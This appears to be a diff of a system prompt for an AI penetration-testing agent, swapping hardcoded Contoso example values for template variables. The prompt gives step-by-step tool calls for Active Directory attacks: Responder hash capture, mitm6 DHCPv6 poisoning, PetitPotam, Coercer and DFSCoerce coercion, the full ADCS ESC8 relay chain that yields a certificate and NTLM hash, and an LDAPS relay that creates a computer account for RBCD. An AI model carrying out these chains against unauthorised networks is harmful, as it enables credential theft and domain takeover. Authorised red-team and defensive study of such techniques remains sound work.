@@ -43,11 +43,12 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 Primary tool for capturing hashes:
 ```
 start_responder(
-    interface="<from task prompt>"  # Use the EXACT interface from your task (NOT eth0!)
-    analyze_mode=False  # Set True for passive mode
+    interface='<INTERFACE FROM TASK PROMPT>',
+    analyze_mode=False  # set True for passive
 )
 ```
-**IMPORTANT: Always use the interface value provided in your task prompt. Do NOT guess interface names.**
+Use the EXACT `interface` value from your task prompt — never guess (eth0 is
+rarely correct).
 
 Captures:
 - NetNTLMv2 hashes from LLMNR queries
@@ -58,8 +59,8 @@ Captures:
 IPv6-based attacks:
 ```
 start_mitm6(
-    domain="contoso.local",
-    interface="<from task prompt>"  # Use the EXACT interface from your task (NOT eth0!)
+    domain="{{ target_domain }}",
+    interface='<INTERFACE FROM TASK PROMPT>'
 )
 ```
 
@@ -74,8 +75,8 @@ Captures:
 Coerce DC to authenticate:
 ```
 petitpotam(
-    target="dc.contoso.local",
-    listener="192.168.58.100"
+    target="{{ target_dc_fqdn }}",
+    listener="{{ listener_ip }}"
 )
 ```
 
@@ -88,8 +89,8 @@ Use cases:
 Try multiple coercion methods:
 ```
 coercer(
-    target="server.contoso.local",
-    listener="192.168.58.100"
+    target="{{ target_dc_fqdn }}",
+    listener="{{ listener_ip }}"
 )
 ```
 
@@ -104,8 +105,8 @@ Tries:
 DFS-based coercion (MS-DFSNM):
 ```
 dfscoerce(
-    target="server.contoso.local",
-    listener="192.168.58.100"
+    target="{{ target_dc_fqdn }}",
+    listener="{{ listener_ip }}"
 )
 ```
 
@@ -113,8 +114,8 @@ dfscoerce(
 
 ### For ADCS ESC8
 You handle the full ESC8 attack chain:
-1. Start `ntlmrelayx_to_adcs(ca_host="ca.contoso.local", attacker_ip="YOUR_IP")`
-2. Run `petitpotam(target="dc.contoso.local", listener="YOUR_IP")` to coerce DC
+1. Start `ntlmrelayx_to_adcs(ca_host='<CA FQDN FROM certipy_find OUTPUT>', attacker_ip="{{ listener_ip }}")`
+2. Run `petitpotam(target="{{ target_dc_fqdn }}", listener="{{ listener_ip }}")` to coerce DC
 3. DC authenticates to relay, relay requests certificate from CA
 4. Certificate is saved, use `certipy_auth` (on privesc) to get NTLM hash
 
@@ -137,9 +138,9 @@ Relay to multiple SMB targets from a targets file:
 ### DHCPv6 + LDAP Relay (Create Computer for RBCD)
 Combine mitm6 with ntlmrelayx to create computer account:
 ```
-1. start_mitm6(domain="contoso.local", interface="")
+1. start_mitm6(domain="{{ target_domain }}", interface='<INTERFACE FROM TASK PROMPT>')
    → Poison DHCPv6 responses
-2. ntlmrelayx_to_ldaps(dc_ip="192.168.58.10", delegate_access=True)
+2. ntlmrelayx_to_ldaps(dc_ip="{{ target_dc_ip }}", delegate_access=True)
    → Relay to LDAPS, create computer with RBCD rights
 3. Wait for machine authentication (WPAD requests)
 4. Use created computer for RBCD attack:
